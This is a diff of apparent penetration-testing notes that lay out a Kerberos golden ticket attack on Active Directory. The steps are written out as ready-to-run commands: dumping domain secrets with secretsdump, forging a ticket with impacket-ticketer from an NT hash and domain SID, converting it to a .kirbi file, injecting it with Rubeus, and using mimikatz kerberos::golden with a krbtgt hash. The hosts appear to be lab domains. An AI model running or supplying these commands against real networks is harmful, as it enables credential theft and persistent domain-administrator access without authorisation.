@@ -63,8 +63,22 @@ Domain name (FQDN) → e.g. MARVEL.LOCAL.
 Target user → usually Administrator.
 
 
+impacket-lookupsid ignite/Administrator:Ignite@987@192.168.1.105
+python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -user-status
+
+#using ticketer
+impacket-ticketer -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local Administrator
+export KRB5CCNAME=/root/Tools/impacket/examples/Administrator.ccache
+
+#convert and transfer the kribi file to windows computer.
+impacket-ticketConverter /root/impacket/examples/Administrator.ccache golden.kirbi
+
+#use Rubeus.exe pass the the ticket.
+Rubeus.exe ptt /ticket:golden.kirbi
+
+
 #mimikatz :
-kerberos::golden /User:zoro /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt
+kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt
 
 
 
